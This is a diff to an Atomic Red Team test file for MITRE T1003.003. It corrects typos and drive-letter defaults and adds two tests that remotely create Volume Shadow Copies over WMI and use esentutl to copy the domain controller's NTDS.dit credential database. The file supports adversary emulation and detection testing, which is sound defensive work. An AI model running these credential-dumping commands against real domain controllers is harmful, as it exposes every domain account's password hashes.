@@ -60,7 +60,7 @@ atomic_tests:
     prereq_command: |
       if not exist #{vsc_name} (exit /b 1)
     get_prereq_command: |
-      echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vassadmin'" to fulfuill this requirement
+      echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
   - description: |
       Extract path must exist
     prereq_command: |
@@ -122,9 +122,9 @@ atomic_tests:
   - windows
   input_arguments:
     drive_letter:
-      description: Drive letter to source VSC (including colon)
+      description: Drive letter to source VSC (including colon and backslash)
       type: String
-      default: 'C:'
+      default: 'C:\'
   dependencies:
   - description: |
       Target must be a Domain Controller
@@ -135,6 +135,68 @@ atomic_tests:
   executor:
     command: |
       wmic shadowcopy call create Volume=#{drive_letter}
+    name: command_prompt
+    elevation_required: true
+
+- name: Create Volume Shadow Copy remotely with WMI
+  auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
+  description: |
+    This test is intended to be run from a remote workstation with domain admin context.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+  supported_platforms:
+  - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon and backslash)
+      type: String
+      default: 'C:\'
+    target_host:
+      description: IP Address / Hostname you want to target
+      type: String
+      default: localhost
+  dependencies:
+  - description: |
+      Target must be a reachable Domain Controller, and current context must be domain admin
+    prereq_command: |
+      wmic /node:"#{target_host}" shadowcopy list brief
+    get_prereq_command: |
+      echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+  executor:
+    command: |
+      wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
+    name: command_prompt
+    elevation_required: true
+
+- name: Create Volume Shadow Copy remotely (WMI) with esentutl
+  auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+  description: |
+    This test is intended to be run from a remote workstation with domain admin context.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+  supported_platforms:
+  - windows
+  input_arguments:
+    source_path:
+      description: File to shadow copy
+      type: String
+      default: 'c:\windows\ntds\ntds.dit'
+    target_path:
+      description: Target path of the result file
+      type: String
+      default: 'c:\ntds.dit'
+    target_host:
+      description: IP Address / Hostname you want to target
+      type: String
+      default: localhost
+  dependencies:
+  - description: |
+      Target must be a reachable Domain Controller, and current context must be domain admin
+    prereq_command: |
+      wmic /node:"#{target_host}" shadowcopy list brief
+    get_prereq_command: |
+      echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+  executor:
+    command: |
+      wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
     name: command_prompt
     elevation_required: true
 
@@ -150,10 +212,10 @@ atomic_tests:
     drive_letter:
       description: Drive letter to source VSC (including colon)
       type: String
-      default: 'C:'
+      default: 'C:\'
   executor:
     command: |
-      (gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')
+      (gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
     name: powershell
     elevation_required: true
 
